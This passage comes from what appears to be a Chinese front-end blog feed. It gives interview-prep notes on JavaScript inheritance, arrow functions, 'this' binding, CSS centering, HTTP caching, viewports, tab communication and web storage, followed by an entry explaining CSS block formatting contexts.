punctuation">.</span>prototype <span class="token operator">=</span> p<span class="token punctuation">}</span><span class="token comment" spellcheck="true">//父类</span><span class="token keyword">function</span> <span class="token function">SuperClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">}</span><span class="token comment" spellcheck="true">//子类</span><span class="token keyword">function</span> <span class="token function">SubClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>time<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//构造函数式继承</span>    SuperClass<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>time <span class="token operator">=</span> time<span class="token punctuation">}</span><span class="token comment" spellcheck="true">//寄生式继承父类原型</span><span class="token function">inheritPrototype</span><span class="token punctuation">(</span>subClass<span class="token punctuation">,</span>superClass<span class="token punctuation">)</span></code></pre><h2 id="介绍一下箭头函数"><a href="#介绍一下箭头函数" class="headerlink" title="介绍一下箭头函数"></a>介绍一下箭头函数</h2><p>箭头函数的含义</p><pre class=" language-js"><code class="language-js">x <span class="token operator">=</span><span class="token operator">></span> x <span class="token operator">*</span> x  <span class="token comment" spellcheck="true">// 相当于</span><span class="token keyword">function</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> x <span class="token operator">*</span> x<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ul><li>说一下箭头函数和普通函数的区别</li></ul><p>（1）箭头函数是匿名函数，不能作为构造函数，不能使用new<br>（2）箭头函数不绑定arguments，取而代之用rest参数…解决</p><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> B <span class="token operator">=</span> <span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">B</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Uncaught ReferenceError: arguments is not defined</span><span class="token keyword">let</span> C <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">...</span>c<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">11323</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// [3, 82, 32, 11323]   </span></code></pre><p>（3）箭头函数不绑定this，会捕获其所在的上下文的this值，作为自己的this值<br>（4）箭头函数通过 call() 或 apply() 方法调用一个函数时，对 this 并没有影响。<br>（5）箭头函数没有原型属性</p><h2 id="this-的指向"><a href="#this-的指向" class="headerlink" title="this 的指向"></a>this 的指向</h2><ul><li>普通函数指向函数调用者（执行的时候才确定）</li><li>箭头函数指向函数所在的作用域（对象的{}和if(){}都构不成作用域）</li></ul><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>    name<span class="token punctuation">:</span><span class="token string">'objName'</span><span class="token punctuation">,</span>    say<span class="token punctuation">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    read<span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>obj<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//objName     指向的是调用者</span>obj<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//undefined   指向的是window.name</span></code></pre><p>怎么答：</p><ol><li>全局环境中的this指向全局对象window</li><li>new绑定，并且构造函数没有<strong>返回其他对象</strong>，this指向这个新对象</li><li>通过call，apply，bind，并且第一个参数值不是Null,undefined，那么this绑定的就是指定的对象</li><li>普通函数指向函数调用者（执行的时候才确定）</li><li>箭头函数指向函数所在的作用域，根据上下文确定</li></ol><p>关于第二条</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token string">'追梦子'</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fn</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//undefined</span></code></pre><h2 id="简述CSS选择器的优先级规则"><a href="#简述CSS选择器的优先级规则" class="headerlink" title="简述CSS选择器的优先级规则"></a>简述CSS选择器的优先级规则</h2><blockquote><p>优先级不同，高优先级属性覆盖低优先级属性<br>优先级相同，定义在后覆盖定义在先</p><p>内联 &gt; ID选择器 &gt; 类选择器 &gt; 标签选择器，伪类&gt;元素标记  !important最高，但是在低版本IE有兼容性问题</p></blockquote><h2 id="简述居中一个元素的方法"><a href="#简述居中一个元素的方法" class="headerlink" title="简述居中一个元素的方法"></a>简述居中一个元素的方法</h2><p>考虑：水平还是垂直，块还是行内，是否需要知道宽高，兼容性</p><p>（1）水平：</p><pre class=" language-js"><code class="language-js"><span class="token number">1</span><span class="token punctuation">.</span> 块元素：margin<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">,</span>auto<span class="token number">2</span><span class="token punctuation">.</span> 行内元素，行内块元素：text<span class="token operator">-</span>align<span class="token punctuation">:</span>center</code></pre><p>（2）垂直：</p><ol start="3"><li><p>行内元素：line-height：xxpx</p></li><li><p>行内块元素：line-height：xxpx；vertical-align：middle</p></li></ol><p>（3）水平竖直同时居中</p><p> absolute方法：</p><ol start="5"><li>已知宽高：负数margin</li></ol><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.parent</span></span><span class="token punctuation">{</span>    <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.child</span></span><span class="token punctuation">{</span>    <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>    <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">50%</span><span class="token punctuation">;</span>    <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">50%</span><span class="token punctuation">;</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">80</span>px<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">60</span>px<span class="token punctuation">;</span>    <span class="token property">margin-left</span><span class="token punctuation">:</span> -<span class="token number">40</span>px<span class="token punctuation">;</span>    <span class="token property">margin-top</span><span class="token punctuation">:</span> -<span class="token number">30</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ol start="6"><li>已知宽高：calc</li></ol><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.parent</span></span><span class="token punctuation">{</span>    <span class="token property">position</span><span class="token punctuation">:</span>relative<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.child</span></span><span class="token punctuation">{</span>    <span class="token property">position</span><span class="token punctuation">:</span>absolute<span class="token punctuation">;</span>    <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">80</span>px<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">60</span>px<span class="token punctuation">;</span>    <span class="token property">top</span><span class="token punctuation">:</span><span class="token function">calc</span><span class="token punctuation">(</span><span class="token number">50%</span> - <span class="token number">30</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">left</span><span class="token punctuation">:</span><span class="token function">calc</span><span class="token punctuation">(</span><span class="token number">50%</span> - <span class="token number">40</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><ol start="7"><li>需要设定宽高：margin auto</li></ol><pre class=" language-css"><code class="language-css">    <span class="token selector"><span class="token class">.f14</span> <span class="token class">.parent</span></span><span class="token punctuation">{</span>        <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.f14</span> <span class="token class">.child</span></span><span class="token punctuation">{</span>        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>        <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">right</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">bottom</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">50</span>px<span class="token punctuation">;</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">80</span>px<span class="token punctuation">;</span>        <span class="token property">margin</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><ol start="8"><li>不需要设定宽高：transform(css3,IE8及以下不支持)</li></ol><pre class=" language-css"><code class="language-css">    <span class="token selector"><span class="token class">.f15</span> <span class="token class">.parent</span></span><span class="token punctuation">{</span>        <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.f15</span> <span class="token class">.child</span></span><span class="token punctuation">{</span>        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>        <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">50%</span><span class="token punctuation">;</span>        <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">50%</span><span class="token punctuation">;</span>        <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translate</span><span class="token punctuation">(</span>-<span class="token number">50%</span>,-<span class="token number">50%</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  自身偏移    <span class="token punctuation">}</span></code></pre><ol start="9"><li>flex布局</li></ol><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.main</span></span><span class="token punctuation">{</span>     <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>     <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>     <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span> <span class="token punctuation">}</span></code></pre><ol start="10"><li>table-cell + inline-block</li></ol><p>css新增的table属性，可以让我们把普通元素，变为table元素的现实效果，通过这个特性也可以实现水平垂直居中，这个属性和table标签一样的居中原理。</p><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.parent</span></span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> table-cell<span class="token punctuation">;</span>    <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>    <span class="token property">vertical-align</span><span class="token punctuation">:</span> middle<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.child</span></span><span class="token punctuation">{</span>    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="浏览器缓存和webpack缓存配置"><a href="#浏览器缓存和webpack缓存配置" class="headerlink" title="浏览器缓存和webpack缓存配置"></a>浏览器缓存和webpack缓存配置</h2><p><strong>我们经常谈论的浏览器缓存（强缓存，协商缓存）指的都是HTTP缓存</strong></p><ul><li><a href="https://juejin.cn/post/6844903763665240072" target="_blank" rel="noopener">浏览器缓存: 重点看</a></li><li><a href="https://www.jiangruitao.com/webpack/hash-chunkhash-contenthash/" target="_blank" rel="noopener">hash、chunkhash和contenthash区别</a></li><li><a href="https://zhuanlan.zhihu.com/p/63541232" target="_blank" rel="noopener">HTTP缓存、浏览器缓存、应用程序缓存</a></li></ul><blockquote><p>当浏览器再次访问一个已经访问过的资源时，它会这样做：</p><ol><li>看看是否命中强缓存，如果命中，就直接使用缓存了。</li><li>如果没有命中强缓存，就发请求到服务器检查是否命中协商缓存（Etag, Last-modified）。</li><li>如果命中协商缓存，服务器会返回 304 告诉浏览器使用本地缓存。</li><li>否则，请求网络返回最新的资源。</li></ol><p>浏览器缓存的位置：</p><ol><li>Service Worker： 它可以让我们自由控制缓存哪些文件、如何匹配缓存、如何读取缓存，并且缓存是持续性的。</li><li>Memory Cache： 内存缓存，读取内存中的数据肯定比磁盘快。但是内存缓存虽然读取高效，可是缓存持续性很短，会随着进程的释放而释放。 一旦我们关闭 Tab 页面，内存中的缓存也就被释放了。</li><li>Disk Cache: Disk Cache 也就是存储在硬盘中的缓存，读取速度慢点，但是什么都能存储到磁盘中，比之 Memory Cache 胜在容量和存储时效性上。</li></ol></blockquote><blockquote><p>HTTP缓存的基本目的就是使应用执行的更快，更易扩展，但是HTTP缓存通常只适用于idempotent request（可以理解为查询请求，也就是不更新服务端数据的请求），这也就导致了在HTTP的世界里，一般都是对GET请求做缓存，POST请求很少有缓存。</p><p>GET多用来直接获取数据，不修改数据，主要目的就是database的search语句的感觉。用缓存（有个代理服务器的概念）的目的就是查db的速度变快。</p><p>POST则是发送数据到服务器端去存储。类似db里的update delete和insert语句的感觉。更新db的意思。数据必须放在数据库，所以一般都得去访问服务器端，而极少需要缓存。</p></blockquote><p><strong>缓存的实现： 强缓存和协商缓存都是根据 HTTP Header 来实现的，就看 response 中 Cache-Control 的值，如果有max-age=xxx秒，则命中强缓存。如果Cache-Control的值是no-cache，说明没命中强缓存，走协商缓存。</strong></p><p><strong>参数</strong></p><p>public</p><blockquote><p>所有内容都将被缓存(客户端和代理服务器都可缓存)</p></blockquote><p>private</p><blockquote><p>内容只缓存到私有缓存中(仅客户端可以缓存，代理服务器不可缓存) 对于private和public，前端可以认为一样，不用深究）</p></blockquote><p>no-cache</p><blockquote><p>不走强缓存，必须先与服务器确认返回的响应是否被更改，然后才能使用该响应来满足后续对同一个网址的请求。因此，如果存在合适的验证令牌 (ETag)，no-cache 会发起往返通信来验证缓存的响应，如果资源未被更改，可以避免下载。</p></blockquote><p>no-store</p><blockquote><p>所有内容都不会被缓存到缓存或 Internet 临时文件中</p></blockquote><p>must-revalidation/proxy-revalidation</p><blockquote><p>如果缓存的内容失效，请求必须发送到服务器/代理以进行重新验证</p></blockquote><p>max-age=xxx</p><blockquote><p>缓存的内容将在 xxx 秒后失效, 这个选项只在HTTP 1.1可用, 并如果和Last-Modified一起使用时, 优先级较高</p></blockquote><h2 id="meta标签与视口"><a href="#meta标签与视口" class="headerlink" title="meta标签与视口"></a>meta标签与视口</h2><p>首先介绍3个视口的概念</p><ul><li><strong>layout viewport(布局视口)：</strong>在PC端上，布局视口等于浏览器窗口的宽度。而在移动端上，由于要使为PC端浏览器设计的网站能够完全显示在移动端的小屏幕里，此时的布局视口会远大于移动设备的屏幕，就会出现滚动条。js获取布局视口：<code>document.documentElement.clientWidth | document.body.clientWidth</code>；</li><li><strong>visual viewport(视觉视口)：</strong>用户正在看到的网页的区域。用户可以通过缩放来查看网站的内容。如果用户缩小网站，我们看到的网站区域将变大，此时视觉视口也变大了，同理，用户放大网站，我们能看到的网站区域将缩小，此时视觉视口也变小了。不管用户如何缩放，都不会影响到布局视口的宽度。js获取视觉视口：<code>window.innerWidth</code>；</li><li><strong>ideal viewport(理想视口)：</strong>布局视口的一个理想尺寸，只有当布局视口的尺寸等于设备屏幕的尺寸时，才是理想视口。js获取理想视口：<code>window.screen.width</code>；</li><li>页面的滚动条取决于视觉视口和布局视口，页面元素宽度取决于布局视口大小</li></ul><p>我们在开发时，常常加入这样一行代码</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><ul><li><code>width=device-width</code>，这句代码的意思就是把布局视口 = 理想视口。</li><li><code>initial-scale</code>指的是缩放系数。其中有这样的公式：</li></ul><pre class=" language-js"><code class="language-js">视觉视口宽度 <span class="token operator">=</span> 理想视口宽度 <span class="token operator">/</span> 缩放系数 比如iphone加入这段代码时：视觉视口 <span class="token operator">=</span> <span class="token number">320</span><span class="token operator">/</span><span class="token number">1.0</span> <span class="token operator">=</span> <span class="token number">320</span>布局视口 <span class="token operator">=</span> <span class="token number">320</span>当视觉视口<span class="token operator">=</span> 布局视口，页面无滚动条。当改变initial<span class="token operator">-</span>scale时：initial<span class="token operator">-</span>scale <span class="token operator">=</span> <span class="token number">0.5</span> 视觉视口宽度 <span class="token operator">=</span> <span class="token number">320</span> <span class="token operator">/</span> <span class="token number">0.5</span> <span class="token operator">=</span> <span class="token number">640</span>布局视口宽度 <span class="token operator">=</span> <span class="token number">320</span>又因为：视觉视口不能大于布局视口，所以此时，将布局视口的宽度提高等于<span class="token number">640</span>总结：视觉视口 <span class="token operator">=</span> 布局视口 <span class="token operator">=</span> <span class="token number">640</span>initial<span class="token operator">-</span>scale <span class="token operator">=</span> <span class="token number">2</span> 「 div宽度<span class="token number">320</span>，页面有滚动条 」视觉视口宽度 <span class="token operator">=</span> <span class="token number">320</span> <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">=</span> <span class="token number">160</span>布局视口宽度 <span class="token operator">=</span> <span class="token number">320</span>总结：视觉视口 <span class="token operator">&lt;</span> 布局视口 页面出现了滚动条。</code></pre><h2 id="margin-写-3-个值"><a href="#margin-写-3-个值" class="headerlink" title="margin 写 3 个值"></a>margin 写 3 个值</h2><blockquote><p>margin: 20px 40px 60px;（上20px；左、右40px；下60px）</p></blockquote><h2 id="background-size"><a href="#background-size" class="headerlink" title="background-size"></a>background-size</h2><p>正常一个竖屏的封面图，怎么截取中间部分作为封面呢？</p><p><strong>采用background属性设置</strong></p><pre class=" language-html"><code class="language-html"> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>imagecover<span class="token punctuation">"</span></span>       <span class="token attr-name">:</span><span class="token style-attr language-css"><span class="token attr-name"><span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token punctuation">{</span><span class="token string">'background-image'</span><span class="token punctuation">:</span> <span class="token string">'url('</span> + CoverUrl <span class="token string">')'</span><span class="token punctuation">}</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token selector"><span class="token class">.imagecover</span> </span><span class="token punctuation">{</span>                      <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">345</span>px<span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">194</span>px<span class="token punctuation">;</span>        <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>        <span class="token property">background-size</span><span class="token punctuation">:</span> cover<span class="token punctuation">;</span>        <span class="token property">background-position</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token property">background-repeat</span><span class="token punctuation">:</span> no-repeat<span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre><ul><li>background-size属性</li></ul><blockquote><p>cover</p></blockquote><p>缩放背景图片以完全覆盖背景区，可能背景图片部分看不见。和 <code>contain</code> 值相反，<code>cover</code> 值尽可能大的缩放背景图像并保持图像的宽高比例（图像不会被压扁）。该背景图以它的全部宽或者高覆盖所在容器。当容器和背景图大小不同时，背景图的 左/右 或者 上/下 部分会被裁剪。</p><blockquote><p>contain</p></blockquote><p>缩放背景图片以完全装入背景区，可能背景区部分空白。<code>contain</code> 尽可能的缩放背景并保持图像的宽高比例（图像不会被压缩）。该背景图会填充所在的容器。当背景图和容器的大小的不同时，容器的空白区域（上/下或者左/右）会显示由 background-color 设置的背景颜色。</p><h2 id="浏览器标签页通信"><a href="#浏览器标签页通信" class="headerlink" title="浏览器标签页通信"></a>浏览器标签页通信</h2><h3 id="cookie-setInterval"><a href="#cookie-setInterval" class="headerlink" title="cookie + setInterval"></a>cookie + setInterval</h3><blockquote><p>想在所有的标签页中实现通信，我们必须将数据存放到一个公共的存储空间，所有的标签页都能获取并且还能进行修改；我们知道，cookie在用户所有浏览器标签页中都是共享的，因此，我们可以尝试把选中的数据存放到cookie中去，由于更新cookie并不能触发任何事件，因此我们需要通过定时器<code>setInterval</code>来主动监听cookie中的值是否改变。</p><p>缺点：定时器存在延时情况</p></blockquote><h3 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h3><blockquote><p>localStorage也是浏览器多个页面共用的存储空间；而且localStorage在一个页面中添加、修改或者删除时，都会在<strong>非当前页面中</strong>被动触发一个<code>storage</code>事件，我们通过在其他页面中监听<code>storage</code>事件，即可拿到<code>storage</code>更新前后的值</p></blockquote><h3 id="webworker"><a href="#webworker" class="headerlink" title="webworker"></a>webworker</h3><blockquote><p>HTML5引入了一个<strong>工作线程（webWorker）</strong>的概念。它允许开发人员编写能够长时间运行而不被用户所中断的后台程序，去执行事务或者逻辑，并同时保证页面对用户的响应。</p><p>简而言之，就是<strong>允许JavaScript创建多个线程，但是子线程完全受主线程控制，且不得操作DOM</strong>。</p><p><strong>从而，</strong>可以用webWorker来处理一些比较耗时的计算。</p><p>webworker也分为Worker和SharedWorker，普通的worker可以直接使用<code>new Worker()</code>创建，只在当前页面中使用；而SharedWorker通过名字我们也能看出，是可以在多个标签页面中数据是共享的；</p></blockquote><h3 id="websocket"><a href="#websocket" class="headerlink" title="websocket"></a>websocket</h3><blockquote><p>websocket作为全双工通信，自然可以实现多个标签页之间的通信；WebSocket是HTML5新增的协议，它的目的是在浏览器和服务器之间建立一个不受限的双向通信的通道。</p></blockquote><h2 id="cookie-localStorage-sessionStorage"><a href="#cookie-localStorage-sessionStorage" class="headerlink" title="cookie, localStorage, sessionStorage"></a>cookie, localStorage, sessionStorage</h2><blockquote><p>cookie是网站为了标示用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。</p><p>cookie数据始终在同源的http请求中携带（即使不需要），记会在浏览器和服务器间来回传递。</p><p>sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。</p></blockquote><p><strong>存储大小：</strong></p><blockquote><p>cookie数据大小不能超过4k。</p><p>sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大</p></blockquote><p><strong>有效时间：</strong></p><blockquote><p>localStorage  存储持久数据，浏览器关闭后数据不丢失除非主动删除数据；</p><p>sessionStorage 数据在当前浏览器窗口关闭后自动删除。</p><p>cookie     设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BFC</title>
      <link href="2018/08/03/CSS-BFC/"/>
      <url>2018/08/03/CSS-BFC/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是BFC"><a href="#什么是BFC" class="headerlink" title="什么是BFC"></a>什么是BFC</h2><p>在一个Web页面的CSS渲染中，<a href="http://www.w3.org/TR/CSS21/visuren.html#block-formatting" target="_blank" rel="noopener">块级格式化上下文</a> (Block Fromatting Context)是按照块级盒子布局的。W3C对BFC的定义如下：</p><pre class=" language-js"><code class="language-js">浮动元素和绝对定位元素，非块级盒子的块级容器（例如 inline<span class="token operator">-</span>blocks<span class="token punctuation">,</span> table<span class="token operator">-</span>cells<span class="token punctuation">,</span> 和 table<span class="token operator">-</span>captions），以及overflow值不为“visiable”的块级盒子，都会为他们的内容创建新的BFC（块级格式上下文）。</code></pre><p>为了便于理解，我们换一种方式来重新定义BFC。一个HTML元素要创建BFC，则满足下列的任意一个或多个条件即可：</p><p>1、float的值不是none。<br>2、position的值不是static或者relative。<br>3、display的值是inline-block、table-cell、flex、table-caption或者inline-flex<br>4、overflow的值不是visible</p><p>BFC是一个独立的布局环境，其中的元素布局是不受外界的影响，并且在一个BFC中，块盒与行盒（行盒由一行中所有的内联元素所组成）都会垂直的沿着其父元素的边框排列。</p><h2 id="BFC布局规则"><a href="#BFC布局规则" class="headerlink" title="BFC布局规则"></a>BFC布局规则</h2><ol><li>内部的Box会在垂直方向，一个接一个地放置。</li><li>Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠</li><li>每个BFC内部元素的左外边距， 与包含块的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。</li><li>BFC的区域不会与float box重叠。</li><li>BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。</li><li><p>计算BFC的高度时，浮动元素也参与计算</p><h2 id="BFC解决的问题"><a href="#BFC解决的问题" class="headerlink" title="BFC解决的问题"></a>BFC解决的问题</h2></li></ol><table><thead><tr><th>作用</th><th>原理</th></tr></thead><tbody><tr><td>外边距合并问题</td><td>同一个BFC的两个相邻Box的margin会发生重叠</td></tr><tr><td>浮动的高度塌陷问题</td><td>计算BFC的高度时，浮动元素也参与计算</td></tr></tbody></table><hr><h2 id="2-什么是BFC，BFC的布局规则是什么，如何创建BFC"><a href="#2-什么是BFC，BFC的布局规则是什么，如何创建BFC" class="headerlink" title="2.什么是BFC，BFC的布局规则是什么，如何创建BFC"></a>2.什么是BFC，BFC的布局规则是什么，如何创建BFC</h2><ul><li>BFC的定义:</li></ul><blockquote><p> BFC（Block formatting context ）“块级格式上下文”。 是用于布局块级盒子的一块渲染区域。并且与这个区域的外部毫无关系。</p></blockquote><ul><li>BFC的布局规则</li></ul><blockquote><p>内部的Box会在垂直方向，一个接一个地放置。</p><p>Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠。</p><p>每个盒子（块盒与行盒）的margin box的左边，与包含块border box的左边相接触(对于从左往右的格式化，否则相反)。即使存在浮动也是如此。</p><p>BFC的区域不会与float box重叠。</p><p>BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。</p><p>计算BFC的高度时，浮动元素也参与计算。</p></blockquote><ul><li>触发BFC的条件:</li></ul><p>满足下列条件之一就可以触发BFC</p><blockquote><p>1：根元素，即html元素</p><p>2：float的值不为none</p><p>3：overflow的值不为visible</p><p>4：display的值为inline-block、table-cell、table-caption</p><p>5：position的值为absolute或者fixed</p></blockquote><ul><li>BFC的作用</li></ul><p>BFC是页面独立的一个容器，与外界的毫无关系。与不同容器的区别是：</p><p>（1）<strong>可以阻止元素被浮动的元素覆盖</strong>（可做两栏布局自适应）</p><p><img src="https://img-blog.csdnimg.cn/20190428161126130.png" alt="1"></p><p>​       触发红色盒子的BFC后</p><p><img src="https://img-blog.csdnimg.cn/20190428161306268.png" alt="2"></p><p>（2）<strong>解决高度塌陷</strong>：我们知道当浮动的盒子的父元素没有高度时，会出现高度塌陷现象。</p><p>​                                   <img src="https://img-blog.csdnimg.cn/20190428162141491.png" alt="3"></p><p>​           父盒子触发BFC可以解决这个问题,根据布局规则的最后一条。</p><p>（3）<strong>解决同一个BFC区域的垂直方向margin塌陷的问题</strong> </p><p><img src="https://img-blog.csdnimg.cn/20190428165048481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjU3MTI5,size_16,color_FFFFFF,t_70" alt="4"></p><p>​           分为两个不同的BFC之后可以解决 </p>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>智力题</title>
      <link href="2018/08/03/%E9%9D%A2%E8%AF%95-%E6%99%BA%E5%8A%9B%E9%A2%98/"/>
